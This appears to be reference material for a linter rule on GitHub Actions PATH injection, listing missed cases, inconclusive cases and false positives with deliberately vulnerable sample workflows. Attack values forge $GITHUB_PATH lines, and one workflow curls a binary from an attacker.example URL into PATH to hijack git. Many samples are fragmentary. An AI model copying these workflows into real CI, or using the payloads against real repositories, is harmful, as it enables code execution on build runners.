notes.situation: on issues opened, a step has the env key T=X with the issue's title, and writes $T to $GITHUB_PATH.
notes.reason: a todo (the same file): the runner sets the variable T to X= and the title, and a title with a line break writes a line of its own to $GITHUB_PATH.
notes.cause: the rule reads a variable of env by a key equal to its name, and no key is T.
notes.attack_run_behavior: T is X=x, a line break and the rest of the title, and echo writes the lines X=x and /tmp/PWNED to $GITHUB_PATH; the runner puts /tmp/PWNED first in the PATH of the steps after it.

undetected_forms.text: a value that an if compares with strings that the workflow writes in the if (strings compared by == with the value and joined by ||, or the strings of contains(fromJSON('[...]'), value)), where each string has only ASCII letters, digits, spaces, -, _, . and /, does not start with -, and has no - right after a space. The if of the job limits the value in every step of the job, and the if of a step with a run: script limits the value in that step only. In those steps the value equals one of the strings when the case of the letters is ignored, so the rule does not report the value. The attacker still chooses the case of each letter of the value. GitHub's server, which evaluates the if of a job, also takes the Kelvin sign as equal to the letter k and the long s as equal to the letter s; the runner, which evaluates the if of a step, takes the Kelvin sign as equal to the letter k. Where the case of a letter changes what the value names, such as a command, a variable, a file on a file system that tells names apart by their case (the default file system of a Linux runner), a host or a tool, the choice of the case can cause harm

examples.name: if-compared.yml
examples.text:
# situation: on issue_comment, a job runs only when the comment's body is
#   bin, and a step writes ${{ github.event.comment.body }} as a line of
#   $GITHUB_PATH.
# reason: the job's if lets the body be only the string bin, ignoring the
#   case of its letters, so the line is a relative path that the workflow
#   names; the attacker still chooses the case, and on a file system that
#   tells names apart by their case (the default file system of a Linux
#   runner), BIN is another directory than bin.
# cause: the rule does not treat a value that the if of the job compares
#   with such a string as written by the attacker.
# attack-value: github.event.comment.body = "BIN"
# attack-run-behavior: the if passes, and the step writes the line BIN to
#   $GITHUB_PATH.
on:
  issue_comment:
    types: [created]
jobs:
  j:
    if: github.event.comment.body == 'bin'
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.comment.body }}" >> "$GITHUB_PATH"

notes.situation: on issue_comment, a job runs only when the comment's body is bin, and a step writes ${{ github.event.comment.body }} as a line of $GITHUB_PATH.
notes.reason: the job's if lets the body be only the string bin, ignoring the case of its letters, so the line is a relative path that the workflow names; the attacker still chooses the case, and on a file system that tells names apart by their case (the default file system of a Linux runner), BIN is another directory than bin.
notes.cause: the rule does not treat a value that the if of the job compares with such a string as written by the attacker.
notes.attack_run_behavior: the if passes, and the step writes the line BIN to $GITHUB_PATH.

undetected_forms.text: a job on pull_request_review or pull_request_review_comment that runs only for a pull request from a fork, such as a job whose if: condition is github.event.pull_request.head.repo.full_name != github.repository: the run of a review that the attacker writes on the pull request of another person from a fork has the secrets of the repository or a token that writes only where a private repository gives secrets or a token that writes to the runs of pull requests from forks (repo.fork-pr-secrets, repo.fork-pr-write-tokens). The rule does not read the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens for the runs of a review, and does not count the run of a review of a pull request from a fork as a run of the attacker. When the attacker opened the pull request from a fork, a review of that pull request gives the attacker nothing more than the pull request itself gives: the run takes the workflow of the merge commit of the pull request (GitHub's documentation gives refs/pull/<n>/merge as the ref of the run of a review), and the attacker can change that workflow in the pull request

examples.name: fork-review.yml
examples.text:
# situation: on comments on the diff, a step writes the comment's body to
#   $GITHUB_PATH and a later step runs git, in a job that runs only for a
#   pull request from a fork.
# reason: a todo (a fact): the job runs only for a pull request from a
#   fork. Where a private repository gives secrets or a token that writes
#   to the runs of pull requests from forks, the run of a review that the
#   attacker writes on the pull request of another person from a fork has
#   those secrets or that token, and the job runs for the attacker.
# cause: the rule does not read the settings of a private repository for
#   the runs of pull requests from forks, and does not count the run of a
#   review of a pull request from a fork as a run of the attacker.
# attack-value: github.event.comment.body = "/tmp/PWNED"
# attack-run-behavior: the comment of the attacker on the diff of the pull
#   request of another person from a fork starts the job a; the step adds
#   /tmp/PWNED to the front of PATH, and git status runs the program git
#   of that directory if the directory has one.
on: pull_request_review_comment
jobs:
  a:
    if: github.event.pull_request.head.repo.full_name != github.repository
    runs-on: ubuntu-latest
    steps:
      - env:
          B: ${{ github.event.comment.body }}
        run: echo "$B" >> "$GITHUB_PATH"
      - run: git status

notes.situation: on comments on the diff, a step writes the comment's body to $GITHUB_PATH and a later step runs git, in a job that runs only for a pull request from a fork.
notes.reason: a todo (a fact): the job runs only for a pull request from a fork. Where a private repository gives secrets or a token that writes to the runs of pull requests from forks, the run of a review that the attacker writes on the pull request of another person from a fork has those secrets or that token, and the job runs for the attacker.
notes.cause: the rule does not read the settings of a private repository for the runs of pull requests from forks, and does not count the run of a review of a pull request from a fork as a run of the attacker.
notes.attack_run_behavior: the comment of the attacker on the diff of the pull request of another person from a fork starts the job a; the step adds /tmp/PWNED to the front of PATH, and git status runs the program git of that directory if the directory has one.

undetected_forms.text: the summary of a wiki page (github.event.pages[*].summary) in a job that runs on gollum: the rule reads the summary as a value that nobody writes. The gollum payloads that the authors of the linter saw had a null summary each time: for pages made and edited on the web interface of GitHub and pushed by git, an edit message on the web interface and a commit message of git did not go into the summary. The authors saw only pages that the owner of a public repository made and edited, and did not try an edit by an account with no role in the repository

examples.name: wiki-summary.yml
examples.text:
# situation: on gollum, a step writes the summary of the wiki page to
#   $GITHUB_PATH; the next step runs git status.
# reason: a limitation (run time): GitHub decides the summary of a wiki page
#   when the event happens. The gollum payloads that the authors of the
#   linter saw had a null summary each time, for pages made and edited on
#   the web interface and pushed by git; an edit by an account with no role
#   in the repository was not tried.
# cause: the rule reads the summary of a wiki page as a value that nobody
#   writes.
# attack-value: github.event.pages[0].summary = "/tmp/PWNED"
# attack-run-behavior: if GitHub ever put a summary that the editor of the
#   wiki writes in the payload, the summary would choose a directory of the
#   PATH of the next step.
on: gollum
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          SUMMARY: ${{ github.event.pages[0].summary }}
        run: echo "$SUMMARY" >> "$GITHUB_PATH"
      - run: git status

notes.situation: on gollum, a step writes the summary of the wiki page to $GITHUB_PATH; the next step runs git status.
notes.reason: a limitation (run time): GitHub decides the summary of a wiki page when the event happens. The gollum payloads that the authors of the linter saw had a null summary each time, for pages made and edited on the web interface and pushed by git; an edit by an account with no role in the repository was not tried.
notes.cause: the rule reads the summary of a wiki page as a value that nobody writes.
notes.attack_run_behavior: if GitHub ever put a summary that the editor of the wiki writes in the payload, the summary would choose a directory of the PATH of the next step.

undetected_forms.text: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/<file>@<ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form

examples.name: remote-callee.yml
examples.text:
# situation: a job calls the reusable workflow .github/workflows/w.yml of
#   the repository example-org/envpath-injection-unanswered, whose content
#   is the workflow of the true positive controlled
#   (controlled.default-assignment.yml) of the rule, with on: workflow_call
#   in place of the on of controlled.default-assignment.yml. The linter has
#   no answer of the fact workflow.definition for the reusable workflow.
# reason: a todo (a fact): the jobs of a reusable workflow run on the event
#   that started the run of the calling job, and the linter does not read
#   the reusable workflow.
# cause: the rule reads a reusable workflow of another repository only from
#   the answer of workflow.definition.
# attack-value: github.event.issue.title = "/tmp/PWNED"
# attack-run-behavior: the value goes to $GITHUB_PATH.
on:
  issues:
    types: [opened]
permissions: {}
jobs:
  c:
    uses: example-org/envpath-injection-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee

notes.situation: a job calls the reusable workflow .github/workflows/w.yml of the repository example-org/envpath-injection-unanswered, whose content is the workflow of the true positive controlled (controlled.default-assignment.yml) of the rule, with on: workflow_call in place of the on of controlled.default-assignment.yml. The linter has no answer of the fact workflow.definition for the reusable workflow.
notes.reason: a todo (a fact): the jobs of a reusable workflow run on the event that started the run of the calling job, and the linter does not read the reusable workflow.
notes.cause: the rule reads a reusable workflow of another repository only from the answer of workflow.definition.
notes.attack_run_behavior: the value goes to $GITHUB_PATH.

inconclusive_kinds.text: the output of a step that runs a script (steps.<id>.outputs), which the script writes to $GITHUB_OUTPUT

examples.name: step-output-run.yml
examples.text:
# situation: the step s runs a script that writes the output o to
#   $GITHUB_OUTPUT, and the next step writes steps.s.outputs.o to
#   $GITHUB_PATH by ${{ }}.
# reason: the output is what the script writes at run time, so whether an

inconclusive_kinds.text: an input of workflow_dispatch (inputs, github.event.inputs): whoever dispatches the workflow chooses the value of the input. examples.name: input-dispatch.yml

#   step writes inputs.x and github.event.inputs.x to $GITHUB_PATH by ${{

#   workflow does not tell who that is, so whether an attacker controls it

#   access is to the permission Actions dispatches the workflow and gives the

  workflow_dispatch:
    inputs:
      x: {}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "v=${{ inputs.x }} ${{ github.event.inputs.x }}" >> "$GITHUB_PATH"

#   this one, the script writes the lines v=x and /tmp/PWNED to
#   $GITHUB_PATH, and the steps after it get /tmp/PWNED first in PATH.
on: issues
jobs:
  j:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        include:
          - v: ${{ vars.V }}
    steps:
      - run: echo "v=${{ matrix.v }}" >> "$GITHUB_PATH"

notes.situation: the matrix value v is ${{ vars.V }}, not written out in the workflow, and a step writes matrix.v to $GITHUB_PATH by ${{ }}.
notes.reason: what the value holds is not known from the workflow, so whether an attacker controls it is not known.
notes.attack_run_behavior: when vars.V holds a value an attacker wrote, such as this one, the script writes the lines v=x and /tmp/PWNED to $GITHUB_PATH, and the steps after it get /tmp/PWNED first in PATH.

notes.situation: a step puts the body of the issue in the env B and writes "b=$(echo "$B" | head -1)" to $GITHUB_PATH.

notes.attack_run_behavior: when the body's line break is a carriage return, head -1, which ends a line at a line feed only, keeps it, and echo writes b=x, a carriage return and /tmp/PWNED as one line to $GITHUB_PATH; the runner ends a line at a carriage return too, and puts b=x and /tmp/PWNED before the PATH, /tmp/PWNED first.

# situation: a step puts the body of the issue in the env B, sends the
#   output of its script to $GITHUB_PATH by exec, and then runs echo "b=$B".
# reason: after exec, what each later command writes goes to the file; the

#   $GITHUB_PATH, and echo "b=$B" writes the lines b=x and /tmp/PWNED there;

  j:
    runs-on: ubuntu-latest

      - env:
          B: ${{ github.event.issue.body }}

notes.reason: after exec, what each later command writes goes to the file; the rule does not analyze what the script writes after the exec.
notes.attack_run_behavior: exec sends the output of the rest of the script to $GITHUB_PATH, and echo "b=$B" writes the lines b=x and /tmp/PWNED there; the steps after it get /tmp/PWNED first in PATH, and the relative path b=x after it.

# situation: a step puts the body of the issue in the env B; its script

notes.reason: the rule stops following the script where it cannot read it (the case), so what the script writes to the file after that is not analyzed.
notes.attack_run_behavior: the first echo prints a=, as x matches no pattern of the case; echo "b=$B" then writes the lines b=x and /tmp/PWNED to $GITHUB_PATH, and the steps after it get /tmp/PWNED first in PATH, and the relative path b=x after it.

false_positive_forms.text: a value that an if compares with strings that the workflow writes in the if (strings compared by == with the value and joined by ||, or the strings of contains(fromJSON('[...]'), value)), where each string has only ASCII letters, digits, spaces, -, _, . and /, does not start with -, and has no - right after a space, where the rule reports the value although the if limits the value to those strings, because the rule does not read the if in one of three forms. (1) A reusable workflow or a composite action gets the value through an input, and the if of the calling job or the calling step compares the value. The rule reports the value in the file of the reusable workflow or the composite action. The value is harmless when the if of every caller of that file, inside and outside the repository, compares the value. (2) The if compares the value under one name, and the script writes the value under another name: for example, the if compares env.BODY, which the env of the step sets to ${{ github.event.comment.body }}, and the script writes ${{ github.event.comment.body }}; or the if compares ${{ github.head_ref }}, and the script writes ${{ github.event.pull_request.head.ref }}. The value is harmless when the two names hold the same value in the step; the rule does not check that the two names hold the same value. (3) The if of a step that uses an action compares a value that the with or the env of the same step holds. At the start of the job, the runner runs the pre step of each action from another repository whose action.yml has runs.pre, under the condition runs.pre-if of that action.yml and not under the if of the step. For the pre step, the runner evaluates the with and the env of the step, and the code of the pre step may read the inputs. The runner runs no pre step of a local action (./). The value is harmless when the action has no pre step, or when the code of the pre step does not read the value. In each form, the value is harmless only where the case of the letters does not change what the value names (the undetected form if-compared)

examples.name: if-unnarrowed.yml
examples.text:
# situation: on issue_comment created, a step that has the comment's body in
#   env.BODY runs only when env.BODY is deploy, and the step writes
#   ${{ github.event.comment.body }} as a line of $GITHUB_PATH.
# reason: the step's if compares env.BODY, which holds the comment's body,
#   with deploy, so in the step the body is deploy, ignoring the case of its
#   letters: the body has no character that the shell reads as code, no
#   line break, no word that starts with - and no workflow command.
# cause: the rule limits a value by an if only under the name that the if
#   compares: the if compares env.BODY, and the script writes
#   ${{ github.event.comment.body }}; the rule does not check that env.BODY
#   holds the comment's body.
# attack-value: github.event.comment.body = "/tmp/PWNED"
# attack-run-behavior: on GitHub, the step's if is false for such a body,
#   and the runner skips the step.
on:
  issue_comment:
    types: [created]
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - if: env.BODY == 'deploy'
        env:
          BODY: ${{ github.event.comment.body }}
        run: echo "${{ github.event.comment.body }}" >> "$GITHUB_PATH"

notes.situation: on issue_comment created, a step that has the comment's body in env.BODY runs only when env.BODY is deploy, and the step writes ${{ github.event.comment.body }} as a line of $GITHUB_PATH.
notes.reason: the step's if compares env.BODY, which holds the comment's body, with deploy, so in the step the body is deploy, ignoring the case of its letters: the body has no character that the shell reads as code, no line break, no word that starts with - and no workflow command.
notes.cause: the rule limits a value by an if only under the name that the if compares: the if compares env.BODY, and the script writes ${{ github.event.comment.body }}; the rule does not check that env.BODY holds the comment's body.
notes.attack_run_behavior: on GitHub, the step's if is false for such a body, and the runner skips the step.

false_positive_forms.text: a job on pull_request_review or pull_request_review_comment whose if: condition lets the job run only when the head repository of the pull request is a fork, such as a job whose if: condition is github.event.pull_request.head.repo.fork: on a pull request from a branch of the repository, the head repository is the repository itself, so in a repository that is not a fork the job runs only for a review of a pull request from a fork. The run of a review of a pull request from a fork has the secrets of the repository or a token that writes only where a private repository gives secrets or a token that writes to the runs of pull requests from forks (the undetected form fork-review). The rule does not read whether the repository that runs the workflow (not the head repository of the pull request) is a fork, and reports the job as if the job ran for a review of a pull request from a branch of the repository

examples.name: fork-flag-review.yml
examples.text:
# situation: on comments on the diff, a step writes the comment's body to
#   $GITHUB_PATH and a later step runs git, in a job that runs only when
#   the head repository of the pull request is a fork.
# reason: the job runs only when the head repository of the pull request
#   is a fork. On a pull request from a branch of the repository, the head
#   repository is the repository itself, so in a repository that is not a
#   fork the job runs only for a review of a pull request from a fork. In
#   a public repository, the run of such a review has no secrets and a
#   token that only reads; in a private repository, the run has neither
#   secrets nor a token that writes unless the repository gives secrets or
#   a token that writes to the runs of pull requests from forks (the
#   undetected form fork-review).
# cause: the rule does not read whether the repository that runs the
#   workflow (not the head repository of the pull request) is a fork, and
#   reads the job as if the job ran for a review of a pull request from a
#   branch of the repository.
# attack-value: github.event.comment.body = "/tmp/PWNED"
# attack-run-behavior: in a public repository that is not a fork, a review
#   of a pull request from a branch of the repository does not start the
#   job, as the head repository of such a pull request is the repository
#   itself; a review of a pull request from a fork starts the job with no
#   secrets and a token that only reads, so the value reaches no secret
#   and no token that writes.
on: pull_request_review_comment
jobs:
  a:
    if: github.event.pull_request.head.repo.fork
    runs-on: ubuntu-latest
    steps:
      - env:
          B: ${{ github.event.comment.body }}
        run: echo "$B" >> "$GITHUB_PATH"
      - run: git status

notes.situation: on comments on the diff, a step writes the comment's body to $GITHUB_PATH and a later step runs git, in a job that runs only when the head repository of the pull request is a fork.
notes.reason: the job runs only when the head repository of the pull request is a fork. On a pull request from a branch of the repository, the head repository is the repository itself, so in a repository that is not a fork the job runs only for a review of a pull request from a fork. In a public repository, the run of such a review has no secrets and a token that only reads; in a private repository, the run has neither secrets nor a token that writes unless the repository gives secrets or a token that writes to the runs of pull requests from forks (the undetected form fork-review).
notes.cause: the rule does not read whether the repository that runs the workflow (not the head repository of the pull request) is a fork, and reads the job as if the job ran for a review of a pull request from a branch of the repository.
notes.attack_run_behavior: in a public repository that is not a fork, a review of a pull request from a branch of the repository does not start the job, as the head repository of such a pull request is the repository itself; a review of a pull request from a fork starts the job with no secrets and a token that only reads, so the value reaches no secret and no token that writes.

false_positive_forms.text: an assignment in a branch of if, after && or ||, in the body of a loop, or in the body of a function called there, that bash does not run (if false; then s=$KEY; fi): the rule does not read the value of a condition, so the rule reads the assignment as one that may run, and reads the variable as one that may hold the value of the assignment

examples.name: branch-not-run.yml
examples.text:
# situation: on issues opened, a step sets out to $GITHUB_PATH in an if
#   whose condition is false, writes the issue's title to "$out", and goes on
#   when the write fails (|| true); the next step runs git status.
# reason: bash does not run the branch, so out is empty when echo runs, and
#   the title does not go to $GITHUB_PATH.
# cause: the rule does not read the value of the condition of an if, and
#   reads the assignment in the branch as one that may run.
# attack-value: github.event.issue.title = "/tmp/PWNED"
# attack-run-behavior: bash cannot open the file of the empty name and
#   writes nothing, || true keeps the step going, and the PATH of the next
#   step has no /tmp/PWNED.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          V: ${{ github.event.issue.title }}
        run: |
          if false; then out=$GITHUB_PATH; fi
          echo "$V" >> "$out" || true
      - run: git status

notes.situation: on issues opened, a step sets out to $GITHUB_PATH in an if whose condition is false, writes the issue's title to "$out", and goes on when the write fails (|| true); the next step runs git status.
notes.reason: bash does not run the branch, so out is empty when echo runs, and the title does not go to $GITHUB_PATH.
notes.cause: the rule does not read the value of the condition of an if, and reads the assignment in the branch as one that may run.
notes.attack_run_behavior: bash cannot open the file of the empty name and writes nothing, || true keeps the step going, and the PATH of the next step has no /tmp/PWNED.

false_positive_forms.text: a variable of env that the script sets again, before the script writes the variable to $GITHUB_PATH, by an assignment that bash runs each time the script reaches the write, in the same shell as the write (not in a subshell, a $( ) or a command of a pipeline, not before a command name, and not as local in a shell function), and whose value holds nothing of the variable of env (X="$HOME/tools"; echo "$X" >> "$GITHUB_PATH"): at the write the variable holds the value of the assignment, and the rule still reads the variable as holding the value of env

examples.name: reassigned-variable.yml

# reason: the script writes the path of $HOME/tools, the value that the
#   script sets, not the issue's title.
# cause: the rule reads $V as the value of env, and does not read the
#   assignment in the script before the write.
# attack-value: github.event.issue.title = "/tmp/PWNED"
# attack-run-behavior: V is the path of $HOME/tools when echo runs, so the
#   PATH of the next step has no /tmp/PWNED.

notes.situation: on issues opened, the step's env sets V to the issue's title, and the script sets V to "$HOME/tools" before the script writes "$V" to $GITHUB_PATH; the next step runs git status.
notes.reason: the script writes the path of $HOME/tools, the value that the script sets, not the issue's title.
notes.cause: the rule reads $V as the value of env, and does not read the assignment in the script before the write.
notes.attack_run_behavior: V is the path of $HOME/tools when echo runs, so the PATH of the next step has no /tmp/PWNED.

false_positive_forms.text: a write to $GITHUB_PATH by a command that the script runs in the background (&) with no wait for the command, where the command writes after the shell of the script ends (for example: (sleep 5; echo "$X" >> "$GITHUB_PATH") &): a write that the command makes after the shell of the script ends does not reach the steps after the step; the rule reads the write as a write that reaches $GITHUB_PATH, because whether the command writes before the shell of the script ends depends on how long the commands take when the step runs

examples.name: background-write.yml
examples.text:

#   wait, a subshell that sleeps 5 seconds and then writes the issue's title
#   to $GITHUB_PATH; the shell of the script ends before the write; the next
#   step runs git status.
# reason: a write that the background command makes after the shell of the
#   script ends does not reach the steps after the step (seen on the runner
#   on 2026-11-17 for $GITHUB_ENV and $GITHUB_OUTPUT), so the PATH of the
#   next step does not change.
# cause: the rule reads the write in the background as a write that reaches
#   $GITHUB_PATH, and does not read when the background command writes.
# attack-value: github.event.issue.title = "/tmp/PWNED"

notes.reason: a write that the background command makes after the shell of the script ends does not reach the steps after the step (seen on the runner on 2026-11-17 for $GITHUB_ENV and $GITHUB_OUTPUT), so the PATH of the next step does not change.
notes.cause: the rule reads the write in the background as a write that reaches $GITHUB_PATH, and does not read when the background command writes.

examples.name: no-attacker-executable.yml

false_positive_forms.text: a reusable workflow or a composite action when all of the following are true: the rule does not know all of the callers of the reusable workflow or the composite action; every workflow that runs the reusable workflow or the composite action (directly, or through another reusable workflow or composite action) is a workflow in the same repository; and the rule would report no finding of the finding kind if the rule read the reusable workflow or the composite action only on the events on which the workflows in the same repository run the reusable workflow or the composite action (for example, every workflow that runs the reusable workflow or the composite action runs only on push). When the rule does not know all of the callers, the rule can read the reusable workflow or the composite action on every event (the worst case). For example, the rule does not know all of the callers when no caller is among the inputs; when the inputs are not the whole repository; for a composite action, when an input is excluded or cannot be read; when a caller names the reusable workflow or the composite action by a name of the form owner/repo/path@ref instead of by a ./ path, in which owner/repo is the repository that the --repo flag names, or is any repository when no --repo flag is given; when a step names the composite action by a ./ path, and either no checkout step runs before that step or the last checkout step before that step is not a plain checkout step (a plain checkout step has no ref input, no repository input and no path input); when a step inside a composite action names another composite action by a ./ path; or when the rule does not know all of the callers of a caller

# situation: a reusable workflow that reads the title of an issue, and that
#   only the repository's own workflows call, all of them on push.
# reason: the issue it reads is never an outsider's.
# cause: a callee is read in the worst case, as if a caller ran on issues.
# attack-value: github.event.issue.title = "/tmp/PWNED"
# attack-run-behavior: a run with this title writes the line /tmp/PWNED to
#   $GITHUB_PATH, and the steps after it get /tmp/PWNED first in PATH. In a
#   run of its callers on push, github.event has no issue, so V is empty and
#   echo writes an empty line, which the runner skips.

jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          V: ${{ github.event.issue.title }}
        run: echo "$V" >> "$GITHUB_PATH"

notes.situation: a reusable workflow that reads the title of an issue, and that only the repository's own workflows call, all of them on push.
notes.reason: the issue it reads is never an outsider's.
notes.cause: a callee is read in the worst case, as if a caller ran on issues.
notes.attack_run_behavior: a run with this title writes the line /tmp/PWNED to $GITHUB_PATH, and the steps after it get /tmp/PWNED first in PATH. In a run of its callers on push, github.event has no issue, so V is empty and echo writes an empty line, which the runner skips.

examples.name: .github/workflows/called.yml
examples.text:
# situation: ci.yml of the repository o/r calls this reusable workflow on
#   push only, by the name o/r/.github/workflows/called.yml@main, not by the
#   path ./.github/workflows/called.yml.
# reason: when the run of the linter names the repository (--repo o/r), the
#   call by the name is a call of this file, and the only caller runs on
#   push, which no attacker of the finding kind triggers. A run without
#   --repo reads the call by the name o/r/.github/workflows/called.yml@main
#   as a call that may name a file of the repository, because the run does
#   not know which repository the inputs are; the rule does not resolve the
#   call to this file, so the rule reads this file on every event and reports
#   the same finding.
# cause: the rule does not resolve a call by the name of the repository to
#   the file, so the rule reads this workflow on every event.
# attack-value: github.event.issue.body = "https://attacker.example/git\n/tmp/t\n/tmp/PWNED"

examples.text:
# situation: on status and push, the job runs only on status (its if), and
#   writes the message of the commit of the status
#   (github.event.commit.commit.message) where the rule reads it.
# reason: no app outside GitHub Actions makes a commit status or a check run
#   for a commit whose message an attacker writes in the repository: no app
#   makes one for a commit of a pull request from a fork
#   (repo.fork-pr-app-checks false), and no app makes one for a commit that
#   the merge of a pull request puts in a branch
#   (repo.merge-commit-app-checks false), so no run of status has such a
#   commit, and the job does not run on push.
# cause: the rule asks repo.fork-pr-app-checks and
#   repo.merge-commit-app-checks only of a workflow whose on has no event
#   other than status, check_suite and check_run, and the on of this
#   workflow has push.

# attack-run-behavior: the author of a pull request from a fork writes the
#   value in the message of a commit; no app makes a status for the commit,
#   so no run of status starts with the value, and a push by one who can
#   write runs no job.

jobs:
  j:
    if: github.event_name == 'status'
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.commit.commit.message }}" >> "$GITHUB_PATH"

notes.situation: on status and push, the job runs only on status (its if), and writes the message of the commit of the status (github.event.commit.commit.message) where the rule reads it.
notes.reason: no app outside GitHub Actions makes a commit status or a check run for a commit whose message an attacker writes in the repository: no app makes one for a commit of a pull request from a fork (repo.fork-pr-app-checks false), and no app makes one for a commit that the merge of a pull request puts in a branch (repo.merge-commit-app-checks false), so no run of status has such a commit, and the job does not run on push.
notes.cause: the rule asks repo.fork-pr-app-checks and repo.merge-commit-app-checks only of a workflow whose on has no event other than status, check_suite and check_run, and the on of this workflow has push.
notes.attack_run_behavior: the author of a pull request from a fork writes the value in the message of a commit; no app makes a status for the commit, so no run of status starts with the value, and a push by one who can write runs no job.

false_positive_forms.text: a workflow whose run GitHub does not start, or a job that GitHub fails in the step "Set up job", because of the setting of allowed actions of GitHub (the fact repo.allowed-actions, which the quality rule allowed-actions reads): GitHub does not start a run of a workflow that has a uses, or that calls a reusable workflow that has a uses, that the setting does not allow, and fails a job before any step of the job runs when a step of a composite action that the job runs has a uses that the setting does not allow, or when the setting requires a full commit SHA and a step names an action by a tag or a branch. The harm that the finding reports happens only when GitHub runs the workflow or the job, and the rule does not read repo.allowed-actions

examples.name: actions-not-allowed.yml
examples.text:
# situation: the workflow of the true positive controlled (controlled.yml)
#   of the rule, with a job added whose step uses
#   example-org/not-allowed-action, which the setting of allowed actions of
#   GitHub (repo.allowed-actions) blocks with
#   !example-org/not-allowed-action@*. In the true positive, on issues
#   opened, a step downloads the file the issue's body links to /tmp/t/git,
#   makes it executable, and writes the body to $GITHUB_PATH; the next step
#   runs git status.
# reason: GitHub checks each uses of the workflow before the run starts, and
#   does not start the run because of the uses of
#   example-org/not-allowed-action: no job of the run runs, so what the
#   reason of the true positive says does not happen (in runs that the
#   authors of the rule made on GitHub, such runs ended as startup_failure).
# cause: the rule does not read repo.allowed-actions.
# attack-value: github.event.issue.body = "https://attacker.example/git\n/tmp/t\n/tmp/PWNED"
# attack-run-behavior: GitHub does not start the run, so no step of the run
#   runs, and the attack does nothing.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          BODY: ${{ github.event.issue.body }}
        run: |
          mkdir -p /tmp/t && curl -sLo /tmp/t/git "$(echo "$BODY" | grep -o 'https://[^ ]*' | head -n1)" && chmod +x /tmp/t/git
          echo "$BODY" >> "$GITHUB_PATH"
      - run: git status
  not-allowed:
    runs-on: ubuntu-latest
    steps:
      - uses: example-org/not-allowed-action@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee

notes.situation: the workflow of the true positive controlled (controlled.yml) of the rule, with a job added whose step uses example-org/not-allowed-action, which the setting of allowed actions of GitHub (repo.allowed-actions) blocks with !example-org/not-allowed-action@*. In the true positive, on issues opened, a step downloads the file the issue's body links to /tmp/t/git, makes it executable, and writes the body to $GITHUB_PATH; the next step runs git status.
notes.reason: GitHub checks each uses of the workflow before the run starts, and does not start the run because of the uses of example-org/not-allowed-action: no job of the run runs, so what the reason of the true positive says does not happen (in runs that the authors of the rule made on GitHub, such runs ended as startup_failure).
notes.cause: the rule does not read repo.allowed-actions.
notes.attack_run_behavior: GitHub does not start the run, so no step of the run runs, and the attack does nothing.

false_positive_forms.text: a job that runs only for a pull request from a fork (pull_request, pull_request_review or pull_request_review_comment, with an if that compares github.event.pull_request.head.repo.fork with true, or github.event.pull_request.head.repo.full_name with github.repository), in a repository that is not a fork, in a run of the linter that adds variables-writer or secrets-writer: the rule reads each value of vars and secrets as a value that the attacker writes in every workflow run of the event; the workflow run for a pull request from a fork has no secret except GITHUB_TOKEN and a GITHUB_TOKEN that only reads, unless the settings of a private repository send secrets or a GITHUB_TOKEN that writes to such workflow runs (the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens), and the attacker who writes a variable or a secret gets nothing from the job that the author of the pull request does not get from the code of the pull request. A job with no such if, in a repository where every pull request comes from a fork, is a false positive in the same way. The linter does not tell a workflow run for a pull request from a fork from a workflow run for a pull request from a branch of the repository. A fix: the linter splits the workflow runs of the three events into the runs for a pull request from a fork and the runs for a pull request from a branch of the repository, reads the comparisons of the if with the fork in each, and counts a run for a pull request from a fork only when the facts repo.fork-pr-secrets or repo.fork-pr-write-tokens say that the run gets secrets or a GITHUB_TOKEN that writes. A job with no such if keeps the runs for a pull request from a branch of the repository, and the finding stays. A fact of the rulesets of the repository (a ruleset with the rule Restrict creations on every branch and no actor that may bypass the ruleset) could say that no new branch, and so no pull request from a new branch, can be made, and remove a part of the false positives of a job with no such if; the actors that may bypass a ruleset, the branches made before the ruleset and the names of branches outside the patterns of the ruleset remain. The fix is not observed on GitHub

examples.name: fork-pull-request.yml
examples.text:
# situation: on pull_request, a job that runs only when the head repository
#   of the pull request is a fork writes values of vars and secrets where
#   the rule reads a value that the attacker writes.
# reason: in a run of the linter that adds variables-writer or
#   secrets-writer, the rule reads each value of vars and secrets as a
#   value that the attacker writes. In a repository that is not a fork,
#   the job runs only for a pull request from a fork, and such a workflow
#   run has no secret except GITHUB_TOKEN and a GITHUB_TOKEN that only
#   reads, unless the settings of a private repository send secrets or a
#   GITHUB_TOKEN that writes to the workflow runs for pull requests from
#   forks (the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens).
#   The attacker who writes a variable or a secret gets nothing from the
#   job that the author of the pull request does not get from the code of
#   the pull request.
# cause: the rule counts every workflow run of the event pull_request, and
#   does not tell a workflow run for a pull request from a fork from a
#   workflow run for a pull request from a branch of the repository.
# attack-value: vars.NAME = "x\n/tmp/PWNED\ny"
# attack-run-behavior: a pull request from a branch of the repository does
#   not start the job, as the head repository of such a pull request is the
#   repository itself; a pull request from a fork starts the job with no
#   secret and a GITHUB_TOKEN that only reads, so the value reaches no
#   secret and no token that writes.
on: pull_request
jobs:
  j:
    if: github.event.pull_request.head.repo.fork
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets.TOKEN }} ${{ vars.NAME }} ${{ runner.os }}" >> "$GITHUB_PATH"

